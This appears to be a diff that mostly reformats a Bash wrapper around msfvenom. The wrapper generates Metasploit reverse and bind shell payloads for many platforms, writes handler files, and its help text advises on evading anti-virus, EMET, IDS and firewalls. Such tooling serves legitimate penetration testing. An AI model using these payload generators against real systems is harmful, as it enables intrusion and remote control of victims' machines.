@@ -46,7 +46,7 @@
 
 
 ##### Variables
-OUTPATH="$(pwd)/"      # Others: ./   /tmp/   /var/www/
+OUTPATH="$( pwd )/"      # Others: ./   /tmp/   /var/www/
 
 ##### (Cosmetic) Colour output
 RED="\033[01;31m"      # Issues/Errors
@@ -57,7 +57,7 @@ BOLD="\033[01;01m"     # Highlight
 RESET="\033[00m"       # Normal
 
 ##### Read command line arguments
-TYPE=""                #"$(echo ${1} | \tr '[:upper:]' '[:lower:]')"   Defalut: *REQUIRED*
+TYPE=""                #"$( echo ${1} | \tr '[:upper:]' '[:lower:]' )" Defalut: *REQUIRED*
 IP=""                  #"${2}"                                         Defalut: *IP menu*
 PORT=""                #"${3}"                                         Deafult: 443
 SHELL=""               # shell // meterpreter                          Default: meterpreter
@@ -103,24 +103,31 @@ function doAction {
   FILEHANDLE="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}-${FILEEXT}.rc"
 
   X="  IP"
-  [[ "${DOMAIN}" == "true" ]] && X='NAME'
-  [[ "${VERBOSE}" == "true" ]] && PADDING='     '
+  [[ "${DOMAIN}" == "true" ]] \
+    && X='NAME'
+  [[ "${VERBOSE}" == "true" ]] \
+    && PADDING='     '
 
   echo -e " ${YELLOW}[i]${RESET}${PADDING} ${X}: ${YELLOW}${IP}${RESET}"
   echo -e " ${YELLOW}[i]${RESET}${PADDING} PORT: ${YELLOW}${PORT}${RESET}"
   echo -e " ${YELLOW}[i]${RESET}${PADDING} TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}     SHELL: ${YELLOW}${SHELL}${RESET}"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} DIRECTION: ${YELLOW}${DIRECTION}${RESET}"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}     STAGE: ${YELLOW}${STAGE}${RESET}"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}    METHOD: ${YELLOW}${METHOD}${RESET}"
+  if [[ "${VERBOSE}" == "true" ]]; then
+    echo -e " ${YELLOW}[i]${RESET}     SHELL: ${YELLOW}${SHELL}${RESET}"
+    echo -e " ${YELLOW}[i]${RESET} DIRECTION: ${YELLOW}${DIRECTION}${RESET}"
+    echo -e " ${YELLOW}[i]${RESET}     STAGE: ${YELLOW}${STAGE}${RESET}"
+    echo -e " ${YELLOW}[i]${RESET}    METHOD: ${YELLOW}${METHOD}${RESET}"
+  fi
   echo -e " ${YELLOW}[i]${RESET}${PADDING}  CMD: ${BOLD}${CMD}${RESET}"
   echo ""
 
-  CMD=$(echo $CMD | sed 's/\\\\\n//g')
+  CMD=$( echo $CMD | sed 's/\\\\\n//g' )
 
-  [[ -e "${FILENAME}" ]] && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" && rm -f "${FILENAME}"
+  [[ -e "${FILENAME}" ]] \
+    && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" \
+    && rm -f "${FILENAME}"
   eval "${CMD}" 2>/tmp/msfpc.out
-  [[ ! -s "${FILENAME}" ]] && rm -f "${FILENAME}"
+  [[ ! -s "${FILENAME}" ]] \
+    && rm -f "${FILENAME}"
   if [[ -e "${FILENAME}" ]]; then
     echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
     echo ""
@@ -134,7 +141,9 @@ function doAction {
     else
       echo -e "\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
       echo -e "\n----------------------------------------------------------------------------------------"
-      [ -e "/usr/share/metasploit-framework/build_rev.txt" ] && \cat /usr/share/metasploit-framework/build_rev.txt || \msfconsole -v
+      [ -e "/usr/share/metasploit-framework/build_rev.txt" ] \
+        && \cat /usr/share/metasploit-framework/build_rev.txt \
+        || \msfconsole -v
       \uname -a
       echo -e "----------------------------------------------------------------------------------------${RED}"
       \cat /tmp/msfpc.out
@@ -144,14 +153,17 @@ function doAction {
   fi
   #\rm -f /tmp/msfpc.out
 
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} File: $(\file -b ${FILENAME})"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} Size: $(\du -h ${FILENAME} | \cut -f1)"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}  MD5: $(\openssl md5 ${FILENAME} | \awk '{print $2}')"
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} SHA1: $(\openssl sha1 ${FILENAME} | \awk '{print $2}')"
-  [[ "${VERBOSE}" == "true" ]] && echo -e ""
+  if [[ "${VERBOSE}" == "true" ]]; then
+    echo -e " ${YELLOW}[i]${RESET} File: $( \file -b ${FILENAME} )"
+    echo -e " ${YELLOW}[i]${RESET} Size: $( \du -h ${FILENAME} | \cut -f1 )"
+    echo -e " ${YELLOW}[i]${RESET}  MD5: $( \openssl md5 ${FILENAME} | \awk '{print $2}' )"
+    echo -e " ${YELLOW}[i]${RESET} SHA1: $( \openssl sha1 ${FILENAME} | \awk '{print $2}' )"
+    echo -e ""
+  fi
 
   HOST="LHOST"
-  [[ "${DIRECTION}" == "bind" ]] && HOST="RHOST"
+  [[ "${DIRECTION}" == "bind" ]] \
+    && HOST="RHOST"
 
   cat <<EOF > "${FILEHANDLE}"
 #
@@ -174,7 +186,7 @@ EOF
   return
 }
 
-## doAction
+## doHelp
 function doHelp {
   echo -e "\n ${BLUE}${0}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)"
   echo -e "   Example: ${BLUE}${0} windows 192.168.1.10${RESET}        # Windows & manual IP."
@@ -207,32 +219,39 @@ function doHelp {
   echo -e " <CMD> is a standard/native command prompt/terminal to interactive with."
   echo -e " <MSF> is a custom cross platform shell, gaining the full power of Metasploit."
   echo -e " Missing <CMD/MSF> will default to <MSF> where possible."
-  [[ "${VERBOSE}" == "true" ]] && echo -e "   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " <MSF> payloads are generally much larger than <CMD>, as it comes with more features."
+  if [[ "${VERBOSE}" == "true" ]]; then
+    echo -e "   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format."
+    echo -e " <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support."
+    echo -e " <MSF> payloads are generally much larger than <CMD>, as it comes with more features."
+  fi
   echo ""
   echo -e " <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target."
   echo -e " <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target."
   echo -e " Missing <BIND/REVERSE> will default to <REVERSE>."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access."
+  [[ "${VERBOSE}" == "true" ]] \
+    && echo -e " <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access."
   echo ""
   echo -e " <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit."
   echo -e " <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>."
   echo -e " Missing <STAGED/STAGELESS> will default to <STAGED> where possible."
-  [[ "${VERBOSE}" == "true" ]] && echo -e "   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " <STAGED> are 'better' in low-bandwidth/high-latency environments."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads"
-  [[ "${VERBOSE}" == "true" ]] && echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payload-types/"
-  [[ "${VERBOSE}" == "true" ]] && echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payloads/"
+  if [[ "${VERBOSE}" == "true" ]]; then
+    echo -e "   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format."
+    echo -e " <STAGED> are 'better' in low-bandwidth/high-latency environments."
+    echo -e " <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS."
+    echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads"
+    echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payload-types/"
+    echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payloads/"
+  fi
   echo ""
   echo -e " <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs."
   echo -e " <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80."
   echo -e " <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443."
   echo -e " <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>."
   echo -e " Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size."
-  [[ "${VERBOSE}" == "true" ]] && echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication"
+  if [[ "${VERBOSE}" == "true" ]]; then
+    echo -e " By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size."
+    echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication"
+  fi
   echo ""
   echo -e " <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> "
   echo -e " <LOOP> will just create one of each <TYPE>."
@@ -251,29 +270,33 @@ echo -e " ${BLUE}[*]${RESET} ${BLUE}MSF${RESET}venom ${BLUE}P${RESET}ayload ${BL
 
 ## Check system
 ## Are we using Linux or OSX?
-if [[ "$(\uname)" != "Linux" ]] && [[ "$(\uname)" != "Darwin" ]]; then
+if [[ "$( \uname )" != "Linux" ]] && [[ "$( \uname )" != "Darwin" ]]; then
   echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}You're not using Unix-like OS${RESET}" >&2
   exit 3
-elif [[ "$(\uname)" = "Darwin" ]]; then
+elif [[ "$( \uname )" = "Darwin" ]]; then
   DARWIN=true
 fi
 
 ## msfvenom installed?
-if [[ ! -n "$(\which msfvenom)" ]]; then
+if [[ ! -n "$( \which msfvenom )" ]]; then
   echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}" >&2
   exit 3
 fi
 
 ## cURL/wget installed?
-if [[ -n "$(\which curl)" || -n "$(\which wget)" ]]; then
+if [[ -n "$( \which curl )" || -n "$( \which wget )" ]]; then
   ## Try and get external IP
   WAN=""
-  [[ -n "$(\which curl)" ]] && CMD="\curl -s" || CMD="\wget -U 'curl' -qO-"
+  [[ -n "$( \which curl )" ]] \
+    && CMD="\curl -s --max-time 3" \
+    || CMD="\wget -U 'curl' --connect-timeout 3 -qO-"
   for url in 'http://ipinfo.io/ip' 'http://ifconfig.io/'; do
-    WAN=$(eval ${CMD} "${url}")
-    [[ -n "${WAN}" ]] && break
+    WAN=$( eval ${CMD} "${url}" )
+    [[ -n "${WAN}" ]] \
+      && break
   done
-  [[ "${VERBOSE}" == "true" && -z "${WAN}" ]] && echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't get external WAN IP${RESET}" >&2
+  [[ "${VERBOSE}" == "true" && -z "${WAN}" ]] \
+    && echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't get external WAN IP${RESET}" >&2
 fi
 
 ## Is there a writeable path for us?
@@ -284,15 +307,16 @@ fi
 
 
 ## Get default values (before batch/loop)
-[[ -z "${PORT}" ]] && PORT="443"
+[[ -z "${PORT}" ]] \
+  && PORT="443"
 
 ## Get NIC information
 if [[ "$DARWIN" = "true" ]]; then   # OSX users
-  IFACE=( $(for IFACE in $(\ifconfig -l -u | \tr ' ' '\n'); do if (\ifconfig ${IFACE} | \grep inet 1>/dev/null); then echo ${IFACE}; fi; done) )
-  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $(\ifconfig "${IFACE[${i}]}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}') ); done
+  IFACE=( $( for IFACE in $( \ifconfig -l -u | \tr ' ' '\n' ); do if ( \ifconfig ${IFACE} | \grep inet 1>/dev/null ); then echo ${IFACE}; fi; done ) )
+  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \ifconfig "${IFACE[${i}]}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}' ) ); done
 else    # nix users
-  IFACE=( $(\awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__') )
-  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $(\ip addr list "${IFACE[${i}]}" | \grep 'inet ' | \cut -d' ' -f6 | \cut -d '/' -f1) ); done
+  IFACE=( $( \awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__' ) )
+  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \ip addr list "${IFACE[${i}]}" | \grep 'inet ' | \cut -d' ' -f6 | \cut -d '/' -f1 ) ); done
 fi
 
 ## Define TYPEs/FORMATs
@@ -316,7 +340,7 @@ if [[ -z "${IPs}" ]]; then
 fi
 
 ## (!!!Magic Alert!!!) Try to predict what's what with inputs...
-for x in $(\tr '[:upper:]' '[:lower:]' <<< "$@" ); do
+for x in $( \tr '[:upper:]' '[:lower:]' <<< "$@" ); do
     if [[ "${x}" =~ ^--* ]]; then true                                                                                                        # Long argument? (skip!)
   elif [[ "${x}" == "list" || "${x}" == "ls" || "${x}" == "options" || "${x}" == "show" || "${x}" == "help" ]]; then HELP=true                # List types? (aka help screen)
   elif [[ "${x}" == "verbose" || "${x}" == "v" ]]; then VERBOSE=true                                                                          # Verbose?
@@ -341,7 +365,9 @@ for x in $(\tr '[:upper:]' '[:lower:]' <<< "$@" ); do
     for (( i=0; i<${#IFACE[@]}; ++i )); do [[ "${x}" == "${IFACE[${i}]}" ]] && IP="${IPs[${i}]}" && known=true && break; done                 # Interface? (rather than a an IP)
     for (( i=0; i<${#TYPEs[@]}; ++i )); do [[ "${x}" == "${TYPEs[${i}]}" ]] && TYPE="${TYPEs[${i}]}" && known=true && break; done             # Type?
     for (( i=0; i<${#FORMATs[@]}; ++i )); do [[ "${x}" == "${FORMATs[${i}]}" ]] && TYPE="${FORMATs[${i}]}" && known=true && break; done       # Type? (aka formats)
-    [[ "${known}" == false ]] && echo -e " ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}" && exit 1                         # ...if we got this far, we failed. =(
+    [[ "${known}" == false ]] \
+      && echo -e " ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}" \
+      && exit 1                         # ...if we got this far, we failed. =(
   fi
 done
 
@@ -349,7 +375,7 @@ done
 while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
   opt="${1}";
   shift;
-  case "$(echo ${opt} | tr '[:upper:]' '[:lower:]')" in
+  case "$( echo ${opt} | tr '[:upper:]' '[:lower:]' )" in
     -|-- ) break 2;;
 
     -p|--platform )
@@ -428,7 +454,8 @@ done
 
 
 ## Display help?
-[[ "${HELP}" == true ]] && doHelp
+[[ "${HELP}" == true ]] \
+  && doHelp
 
 
 ## Check input
@@ -452,7 +479,8 @@ for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${IP}" == "${IFACE[${x}]}" ]] && IP=$
 
 ## WAN interface?
 if [[ -n "${WAN}" && "${IP}" == "${WAN}" ]]; then
-  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} WAN IP: ${YELLOW}${WAN}${RESET}  "
+  [[ "${VERBOSE}" == "true" ]] \
+    && echo -e " ${YELLOW}[i]${RESET} WAN IP: ${YELLOW}${WAN}${RESET}  "
 fi
 
 ## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...
@@ -477,13 +505,17 @@ if [[ -n "${TYPE}" && -z "${IP}" ]]; then
   echo -e "\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET} - ${YELLOW}IP address${RESET}?:"
   I=0
   for iface in "${IFACE[@]}"; do
-    IPs[${I}]="$(\ifconfig "${iface}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}')"
-    [[ -z "${IPs[${I}]}" ]] && IPs[${I}]="$(\ifconfig "${iface}" | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1)"
-    [[ -z "${IPs[${I}]}" ]] && IPs[${I}]="UNKNOWN"
+    IPs[${I}]="$( \ifconfig "${iface}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}' )"
+    [[ -z "${IPs[${I}]}" ]] \
+      && IPs[${I}]="$( \ifconfig "${iface}" | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1 )"
+    [[ -z "${IPs[${I}]}" ]] \
+      && IPs[${I}]="UNKNOWN"
     echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"
     I=$[${I}+1]
   done
-  [[ -n "${WAN}" ]] && I=$[${I}+1] && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}]${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}"
+  [[ -n "${WAN}" ]] \
+    && I=$[${I}+1] \
+    && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}]${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}"
   _IP=""
   while [[ -z "${_IP}" ]]; do
     echo -ne " ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}"; read -p ": " INPUT
@@ -502,7 +534,8 @@ fi
 ## Loop mode?
 if [[ "${LOOP}" == "true" ]]; then
   echo -e " ${YELLOW}[i]${RESET} Loop Mode. ${BOLD}Creating one of each TYPE${RESET}, with default values"
-  [[ "${VERBOSE}" == "true" ]] && _VERBOSE="verbose"
+  [[ "${VERBOSE}" == "true" ]] \
+    && _VERBOSE="verbose"
   for (( i=0; i<${#TYPEs[@]}; ++i )); do
     echo ""   # "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"
     eval "${0}" "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"   # chmod +x ${0}
@@ -513,7 +546,8 @@ if [[ "${LOOP}" == "true" ]]; then
   echo ""
 elif [[ "${BATCH}" == "true" ]]; then
   echo -e " ${YELLOW}[i]${RESET} Batch Mode. ${BOLD}Creating as many different combinations as possible${RESET}"
-  [[ "${VERBOSE}" == "true" ]] && _VERBOSE="verbose"
+  [[ "${VERBOSE}" == "true" ]] \
+    && _VERBOSE="verbose"
   for (( i=0; i<${#TYPEs[@]}; ++i )); do
   if [[ -z "${TYPE}" || "${TYPEs[${i}]}" == "${TYPE}" || "${FORMATs[${i}]}" == "${TYPE}" ]]; then
     type="${TYPEs[${i}]}"
@@ -544,8 +578,10 @@ fi
 
 
 ## Set default values (after batch/loop)
-[[ -z "${METHOD}" ]] && METHOD="tcp"
-[[ -z "${DIRECTION}" ]] && DIRECTION="reverse"
+[[ -z "${METHOD}" ]] \
+  && METHOD="tcp"
+[[ -z "${DIRECTION}" ]] \
+  && DIRECTION="reverse"
 
 ## Valid shell?
 if [[ -n "${TYPE}" && "${SHELL}" != "shell" && "${SHELL}" != "meterpreter" && -n "${SHELL}" ]]; then
@@ -571,15 +607,20 @@ fi
 
 ## Bind shell does not use LHOST
 LHOST=""
-[[ "${DIRECTION}" == "reverse" ]] && LHOST="LHOST=${IP}"
+[[ "${DIRECTION}" == "reverse" ]] \
+  && LHOST="LHOST=${IP}"
 
 
 ## Generate #2 (Single Payload)
 ## APK
 if [[ "${TYPE}" == "apk" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="stageless" && _STAGE="/"
-  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="stageless" \
+    && _STAGE="/"
+  [[ "${METHOD}" == "find_port" ]] \
+    && METHOD="allports"
   TYPE="android"
   FILEEXT="apk"
   PAYLOAD="android/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
@@ -589,9 +630,13 @@ if [[ "${TYPE}" == "apk" ]]; then
 
 ## ASP
 elif [[ "${TYPE}" == "asp" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
-  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
+  [[ "${METHOD}" == "find_port" ]] \
+    && METHOD="allports"
   # Can't do: stageless meterpreter - The EXE generator now has a max size of 2048 bytes, please fix the calling module
   if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} ASP. The result is over Metasploit's ${RED}file size limit${RESET}. =(" >&2
@@ -605,9 +650,13 @@ elif [[ "${TYPE}" == "asp" ]]; then
 
 ## ASPX
 elif [[ "${TYPE}" == "aspx" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
-  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
+  [[ "${METHOD}" == "find_port" ]] \
+    && METHOD="allports"
   # Its able todo anything that you throw at it =).
   TYPE="windows"
   FILEEXT="aspx"
@@ -617,8 +666,11 @@ elif [[ "${TYPE}" == "aspx" ]]; then
 
 ## Bash
 elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="shell"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="shell"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Can't do: meterpreter or stageless - Invalid Payload Selected
   # Can't do: bind option // http, https or find_port options
   if [[ "${STAGE}" == "stageless" ]]; then
@@ -636,8 +688,11 @@ elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
 
 ## Java
 elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Can't do: stageless meterpreter - Invalid Payload Selected
   if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Java. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
@@ -650,10 +705,13 @@ elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
 
 ## Linux
 elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="shell"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="shell"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Can't do: stageless meterpreter - Invalid Payload Selected
-  if [[ "${STAGE}" == "stageless"  && "${SHELL}" == "meterpreter" ]]; then
+  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Linux. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
   fi
   TYPE="linux"
@@ -664,8 +722,11 @@ elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; the
 
 ## OSX
 elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="shell"
-  [[ -z "${STAGE}" ]] && STAGE="stageless" && _STAGE="_"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="shell"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="stageless" \
+    && _STAGE="_"
   # Can't do: meterpreter or stageless - Invalid Payload Selected
   if [[ "${STAGE}" == "staged" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} OSX. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
@@ -680,8 +741,11 @@ elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
 
 ## Perl
 elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="shell"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="shell"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Can't do: meterpreter or stageless - Invalid Payload Selected
   if [[ "${STAGE}" == "stageless" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} PERL. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
@@ -696,8 +760,11 @@ elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
 
 ## PHP
 elif [[ "${TYPE}" == "php" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Can't do: shell - Invalid Payload Selected
   if [[ "${SHELL}" == "shell" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} PHP. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
@@ -710,9 +777,13 @@ elif [[ "${TYPE}" == "php" ]]; then
 
 ## Powershell
 elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="stageless" && _STAGE="_"
-  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="stageless" \
+    && _STAGE="_"
+  [[ "${METHOD}" == "find_port" ]] \
+    && METHOD="allports"
   TYPE="windows"
   FILEEXT="ps1"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
@@ -721,8 +792,11 @@ elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
 
 ## Python
 elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
-  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
-  [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
+  [[ -z "${SHELL}" ]] \
+    && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] \
+    && STAGE="staged" \
+    && _STAGE="/"
   # Cant do: staged shell // stageless meterpreter // stageless bind - Invalid Payload Selected
